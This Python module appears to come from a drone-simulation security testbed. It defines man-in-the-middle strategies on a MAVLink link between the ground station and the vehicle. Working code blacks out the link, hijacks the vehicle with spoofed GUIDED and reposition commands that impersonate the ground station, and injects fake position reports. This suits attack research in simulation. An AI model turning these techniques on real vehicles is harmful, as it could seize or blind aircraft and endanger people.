"""
Pluggable man-in-the-middle strategies.

A strategy decides what happens to each message the MITM intercepts on the two
primary directions of the GCS<->vehicle link:

- ``on_downlink``  — telemetry travelling Logic -> GCS
- ``on_uplink``    — commands travelling GCS -> Logic

Each hook returns the (possibly modified) message to forward it, or ``None`` to
drop it. Strategies may also *inject* their own messages via the
:class:`MITMContext` handed to :meth:`MITMStrategy.bind` at startup.

The default :class:`PassthroughStrategy` forwards everything unchanged. New
attacks subclass :class:`MITMStrategy`, take typed constructor kwargs, and
register with :meth:`MITMStrategy.register`; a notebook constructs one
directly (e.g. ``HijackStrategy(trigger_seq=3, ...)``) and assigns it to
``vehicle.mitm``. This mirrors ``Plan``/``PlanSpec``
(``simulator/planner/plan.py``): each strategy builds its own ``self._spec``
so :meth:`MITMStrategy.build` can reconstruct it from JSON on the far side of
the ``simulator.mitm`` subprocess boundary.
"""

from __future__ import annotations

import logging
import math
import threading
from collections.abc import Callable, Sequence
from dataclasses import asdict, dataclass
from typing import Any, ClassVar, TypeAlias, TypeVar, cast

from pymavlink.dialects.v20 import ardupilotmega as mavlink

from simulator.helpers.connections import MAVConnection

MAVMsg: TypeAlias = mavlink.MAVLink_message
S = TypeVar("S", bound="MITMStrategy")


@dataclass(frozen=True)
class MITMSpec:
    """Specification for building a MITMStrategy, JSON-serializable."""

    strategy_class: str
    kwargs: dict[str, Any]

    def to_dict(self) -> dict[str, Any]:
        """Convert MITMSpec to a dictionary."""
        return asdict(self)


class MITMContext:
    """
    Handle that lets a strategy inject MAVLink into the proxied links.

    The MITM owns the two outbound connections; a strategy uses this context to
    originate messages (spoofing, command injection) rather than only
    transforming messages that happen to pass through.
    """

    def __init__(
        self,
        sysid: int,
        to_logic: MAVConnection,
        to_gcs: Sequence[MAVConnection],
    ) -> None:
        self.sysid = sysid
        self._to_logic = to_logic
        self._to_gcs = to_gcs
        # srcSystem 255 makes injected commands look like they came from the
        # real GCS; srcSystem <sysid> makes injected telemetry look like it
        # came from the vehicle itself.
        self._logic_encoder = mavlink.MAVLink(None, srcSystem=255, srcComponent=200)
        self._gcs_encoder = mavlink.MAVLink(None, srcSystem=sysid, srcComponent=200)
        self._lock = threading.Lock()

    def inject_to_logic(self, msg: MAVMsg) -> None:
        """Send an attacker-originated message toward the vehicle's Logic."""
        with self._lock:
            self._to_logic.write(msg.pack(self._logic_encoder))

    def inject_to_gcs(self, msg: MAVMsg, indices: Sequence[int]) -> None:
        """Send an attacker-originated message toward the GCS(s) at `indices`."""
        with self._lock:
            packed = msg.pack(self._gcs_encoder)
            for i in indices:
                self._to_gcs[i].write(packed)


class MITMStrategy:
    """Base strategy: transparent passthrough in both directions."""

    _REGISTRY: ClassVar[dict[str, type[MITMStrategy]]] = {}

    def __init__(self) -> None:
        self.ctx: MITMContext | None = None
        self._spec: MITMSpec | None = None

    def bind(self, ctx: MITMContext) -> None:
        """Receive the injection context once, before relays start."""
        self.ctx = ctx

    def on_downlink(self, msg: MAVMsg) -> MAVMsg | None:
        """Handle a telemetry message travelling Logic -> GCS."""
        return msg

    def on_uplink(self, msg: MAVMsg) -> MAVMsg | None:
        """Handle a command message travelling GCS -> Logic."""
        return msg

    def get_spec(self) -> MITMSpec:
        """Get the specification of this strategy."""
        if self._spec is None:
            raise RuntimeError(
                f"{type(self).__name__} does not expose a specification"
            )
        return self._spec

    @classmethod
    def register(cls, name: str) -> Callable[[type[S]], type[S]]:
        """Register a MITMStrategy subclass under `name`."""

        def decorator(strategy_cls: type[S]) -> type[S]:
            cls._REGISTRY[name] = strategy_cls
            return strategy_cls

        return decorator

    @classmethod
    def build(cls, spec: MITMSpec) -> MITMStrategy:
        """Build a MITMStrategy from its specification (default: passthrough)."""
        strategy_cls = cls._REGISTRY.get(spec.strategy_class)
        if strategy_cls is None:
            logging.warning(
                "Unknown MITM strategy %r; falling back to passthrough",
                spec.strategy_class,
            )
            strategy_cls = PassthroughStrategy
        return strategy_cls(**spec.kwargs)


@MITMStrategy.register("passthrough")
class PassthroughStrategy(MITMStrategy):
    """Forward every message unmodified (default)."""

    def __init__(self) -> None:
        super().__init__()
        self._spec = MITMSpec(strategy_class="passthrough", kwargs={})


@MITMStrategy.register("blackout")
class BlackoutStrategy(MITMStrategy):
    """
    Blind the GCS: drop all commands and all telemetry.

    To avoid deadlocking the simulation, the attacker keeps the link *looking*
    alive: ``HEARTBEAT`` (the GCS blocks on ``wait_heartbeat`` at startup) and
    the ``LOGIC_DONE`` completion signal are still forwarded. Everything else —
    position, mission state, attitude, and all GCS commands — is suppressed.
    """

    #: Downlink message types always forwarded so the sim can run/terminate.
    _ALLOW_DOWNLINK: frozenset[str] = frozenset({"HEARTBEAT", "STATUSTEXT"})

    def __init__(self) -> None:
        super().__init__()
        self._spec = MITMSpec(strategy_class="blackout", kwargs={})

    def on_downlink(self, msg: MAVMsg) -> MAVMsg | None:
        """Drop all telemetry except the keep-alive heartbeat and completion signal."""
        msg_type = msg.get_type()
        if msg_type == "HEARTBEAT":
            return msg
        # Let the LOGIC_DONE completion handshake through; drop other statustext.
        if msg_type == "STATUSTEXT" and getattr(msg, "text", "") == "LOGIC_DONE":
            return msg
        return None

    def on_uplink(self, msg: MAVMsg) -> MAVMsg | None:
        """Drop every command; the GCS cannot reach the vehicle."""
        return None


@MITMStrategy.register("hijack")
class HijackStrategy(MITMStrategy):
    """
    Attacker-driven intervention.

    Watches ``MISSION_CURRENT`` on the relayed telemetry and, once
    ``seq >= trigger_seq``, injects ``SET_MODE(GUIDED)`` + ``DO_REPOSITION``
    toward the vehicle — the same redirect the GCS performed, but originated by
    the man-in-the-middle and spoofed to look like it came from the GCS.
    """

    _GUIDED_CUSTOM_MODE = 4  # ArduCopter GUIDED

    def __init__(
        self,
        trigger_seq: int = 1,
        target_lat: float = 0.0,
        target_lon: float = 0.0,
        target_alt: float = 0.0,
    ) -> None:
        super().__init__()
        self.trigger_seq = trigger_seq
        self.target_lat = target_lat
        self.target_lon = target_lon
        self.target_alt = target_alt
        self._fired = False
        # Builder used only to construct message objects (packed by the context).
        self._builder = mavlink.MAVLink(None, srcSystem=255, srcComponent=200)
        self._spec = MITMSpec(
            strategy_class="hijack",
            kwargs={
                "trigger_seq": trigger_seq,
                "target_lat": target_lat,
                "target_lon": target_lon,
                "target_alt": target_alt,
            },
        )

    def on_downlink(self, msg: MAVMsg) -> MAVMsg | None:
        """Fire the reposition injection once the mission reaches the trigger seq."""
        if not self._fired and msg.get_type() == "MISSION_CURRENT":
            mission_current = cast(mavlink.MAVLink_mission_current_message, msg)
            if mission_current.seq >= self.trigger_seq:
                self._inject_reposition()
                self._fired = True
        return msg  # visible hijack: telemetry still flows to the GCS

    def _inject_reposition(self) -> None:
        if self.ctx is None:
            logging.error("HijackStrategy not bound to a MITMContext; cannot inject")
            return
        sysid = self.ctx.sysid
        logging.info(
            "MITM hijack: redirecting vehicle %s to (%.7f, %.7f, %.1f)",
            sysid,
            self.target_lat,
            self.target_lon,
            self.target_alt,
        )
        set_mode = self._builder.set_mode_encode(
            sysid,
            mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            self._GUIDED_CUSTOM_MODE,
        )
        self.ctx.inject_to_logic(set_mode)
        reposition = self._builder.command_int_encode(
            sysid,
            1,  # autopilot component
            mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
            mavlink.MAV_CMD_DO_REPOSITION,
            0,  # current
            0,  # autocontinue
            -1.0,  # param1: speed, no change
            1.0,  # param2: MAV_DO_REPOSITION_FLAGS_CHANGE_MODE
            0.0,  # param3
            math.nan,  # param4: yaw, no change
            int(self.target_lat * 1e7),
            int(self.target_lon * 1e7),
            self.target_alt,
        )
        self.ctx.inject_to_logic(reposition)


#: Generous bound on distinguishable GCS-per-vehicle count for `target_mask`.
_SPOOF_MAX_GCS = 32


@MITMStrategy.register("spoof_gcs")
class SpoofGCSStrategy(MITMStrategy):
    """
    Inject a fabricated GLOBAL_POSITION_INT toward a chosen subset of GCS.

    Watches ``MISSION_CURRENT`` like `HijackStrategy`; once
    ``seq >= trigger_seq``, injects one fake position report — spoofed to look
    like it came from the vehicle itself — toward the GCS connections selected
    by ``target_mask`` (bit *i* selects the GCS at position *i* in the
    vehicle's GCS list; bit 0 is the owner). Real telemetry keeps flowing
    unmodified to every GCS, so a targeted GCS sees the fabricated report
    interleaved with the genuine stream rather than in place of it — the
    downlink relay fans the same message out to all GCS, so a strategy can't
    suppress it for only some of them.
    """

    def __init__(
        self,
        trigger_seq: int = 1,
        target_mask: int = 0,
        spoof_lat: float = 0.0,
        spoof_lon: float = 0.0,
        spoof_alt: float = 0.0,
    ) -> None:
        super().__init__()
        self.trigger_seq = trigger_seq
        self.target_indices = [
            i for i in range(_SPOOF_MAX_GCS) if target_mask & (1 << i)
        ]
        self.spoof_lat = spoof_lat
        self.spoof_lon = spoof_lon
        self.spoof_alt = spoof_alt
        self._fired = False
        # Builder used only to construct message objects (packed by the context).
        self._builder = mavlink.MAVLink(None, srcSystem=255, srcComponent=200)
        self._spec = MITMSpec(
            strategy_class="spoof_gcs",
            kwargs={
                "trigger_seq": trigger_seq,
                "target_mask": target_mask,
                "spoof_lat": spoof_lat,
                "spoof_lon": spoof_lon,
                "spoof_alt": spoof_alt,
            },
        )

    def on_downlink(self, msg: MAVMsg) -> MAVMsg | None:
        """Fire the spoofed position injection once the trigger seq is reached."""
        if (
            not self._fired
            and self.target_indices
            and msg.get_type() == "MISSION_CURRENT"
        ):
            mission_current = cast(mavlink.MAVLink_mission_current_message, msg)
            if mission_current.seq >= self.trigger_seq:
                self._inject_spoofed_position()
                self._fired = True
        return msg  # real telemetry still reaches every GCS

    def _inject_spoofed_position(self) -> None:
        if self.ctx is None:
            logging.error("SpoofGCSStrategy not bound to a MITMContext; cannot inject")
            return
        logging.info(
            "MITM spoof: reporting fake position (%.7f, %.7f, %.1f) to GCS %s",
            self.spoof_lat,
            self.spoof_lon,
            self.spoof_alt,
            self.target_indices,
        )
        fake_position = self._builder.global_position_int_encode(
            0,  # time_boot_ms
            int(self.spoof_lat * 1e7),
            int(self.spoof_lon * 1e7),
            int(self.spoof_alt * 1000),
            int(self.spoof_alt * 1000),  # relative_alt: no home reference here
            0,  # vx
            0,  # vy
            0,  # vz
            0xFFFF,  # hdg: unknown
        )
        self.ctx.inject_to_gcs(fake_position, self.target_indices)


@MITMStrategy.register("spoof_owner_gcs")
class SpoofOwnerGCSStrategy(SpoofGCSStrategy):
    """
    `SpoofGCSStrategy` that always targets only the owner GCS (index 0).

    Same as `SpoofGCSStrategy` minus `target_mask`, which isn't exposed here.
    """

    def __init__(
        self,
        trigger_seq: int = 1,
        spoof_lat: float = 0.0,
        spoof_lon: float = 0.0,
        spoof_alt: float = 0.0,
    ) -> None:
        super().__init__(
            trigger_seq=trigger_seq,
            target_mask=1,  # bit 0 = owner
            spoof_lat=spoof_lat,
            spoof_lon=spoof_lon,
            spoof_alt=spoof_alt,
        )
        self._spec = MITMSpec(
            strategy_class="spoof_owner_gcs",
            kwargs={
                "trigger_seq": trigger_seq,
                "spoof_lat": spoof_lat,
                "spoof_lon": spoof_lon,
                "spoof_alt": spoof_alt,
            },
        )
